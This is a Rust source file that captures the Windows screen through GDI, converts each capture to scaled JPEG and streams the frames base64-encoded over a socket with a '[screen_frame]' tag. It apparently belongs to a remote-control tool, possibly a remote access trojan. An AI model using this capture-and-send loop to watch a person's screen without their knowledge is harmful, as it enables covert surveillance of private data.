// Screen capture using Windows GDI (BitBlt) — no external crate required.
// Produces JPEG via the `image` crate.

use std::{
    sync::{atomic::{AtomicBool, Ordering}, Arc},
    thread,
    time::{Duration, Instant},
};
use base64::{engine::general_purpose::STANDARD, Engine};
use image::{ImageBuffer, Rgb, imageops};

use crate::Sock;
use crate::send;

pub fn stream_loop(sock: Sock, flag: Arc<AtomicBool>, fps: u32) {
    let interval = Duration::from_millis(1000 / fps.max(1) as u64);

    while flag.load(Ordering::SeqCst) {
        let t0 = Instant::now();

        if let Some(jpeg) = capture() {
            let b64 = STANDARD.encode(&jpeg);
            send(&sock, &format!("[screen_frame]{}", b64));
        }

        let elapsed = t0.elapsed();
        if elapsed < interval {
            thread::sleep(interval - elapsed);
        }
    }
}

/// Capture the primary monitor and return JPEG bytes.
pub fn capture() -> Option<Vec<u8>> {
    unsafe {
        use windows::Win32::Graphics::Gdi::*;
        use windows::Win32::UI::WindowsAndMessaging::GetSystemMetrics;
        use windows::Win32::UI::WindowsAndMessaging::{SM_CXSCREEN, SM_CYSCREEN};

        let w = GetSystemMetrics(SM_CXSCREEN);
        let h = GetSystemMetrics(SM_CYSCREEN);
        if w <= 0 || h <= 0 { return None; }

        let screen_dc = GetDC(None);
        let mem_dc    = CreateCompatibleDC(screen_dc);
        let bitmap    = CreateCompatibleBitmap(screen_dc, w, h);
        let old_bmp   = SelectObject(mem_dc, bitmap);

        // In windows crate >= 0.52 BitBlt returns Result<(), Error>
        let blt_ok = BitBlt(mem_dc, 0, 0, w, h, screen_dc, 0, 0, SRCCOPY).is_ok();

        // Read pixels
        let mut bi = BITMAPINFOHEADER {
            biSize:          std::mem::size_of::<BITMAPINFOHEADER>() as u32,
            biWidth:         w,
            biHeight:        -h, // top-down
            biPlanes:        1,
            biBitCount:      32,
            biCompression:   BI_RGB.0,
            biSizeImage:     0,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed:       0,
            biClrImportant:  0,
        };
        let buf_size = (w * h * 4) as usize;
        let mut pixels: Vec<u8> = vec![0u8; buf_size];

        GetDIBits(
            mem_dc,
            bitmap,
            0,
            h as u32,
            Some(pixels.as_mut_ptr() as *mut _),
            &mut BITMAPINFO {
                bmiHeader: bi,
                bmiColors: [RGBQUAD::default(); 1],
            } as *mut _,
            DIB_RGB_COLORS,
        );

        // Cleanup GDI
        SelectObject(mem_dc, old_bmp);
        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(None, screen_dc);

        if !blt_ok { return None; }

        // BGRA → RGB ImageBuffer
        let mut img: ImageBuffer<Rgb<u8>, Vec<u8>> =
            ImageBuffer::new(w as u32, h as u32);

        for (i, pixel) in img.pixels_mut().enumerate() {
            let base = i * 4;
            pixel[0] = pixels[base + 2]; // R
            pixel[1] = pixels[base + 1]; // G
            pixel[2] = pixels[base];     // B
        }

        // Scale down to max 1280×720
        let (nw, nh) = scale_dims(w as u32, h as u32, 1280, 720);
        let img = imageops::resize(&img, nw, nh, imageops::FilterType::Triangle);

        // Encode JPEG quality 50
        let mut buf = Vec::new();
        let mut enc = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut buf, 50);
        enc.encode_image(&img).ok()?;
        Some(buf)
    }
}

fn scale_dims(w: u32, h: u32, max_w: u32, max_h: u32) -> (u32, u32) {
    if w <= max_w && h <= max_h { return (w, h); }
    let scale = (max_w as f32 / w as f32).min(max_h as f32 / h as f32);
    ((w as f32 * scale) as u32, (h as f32 * scale) as u32)
}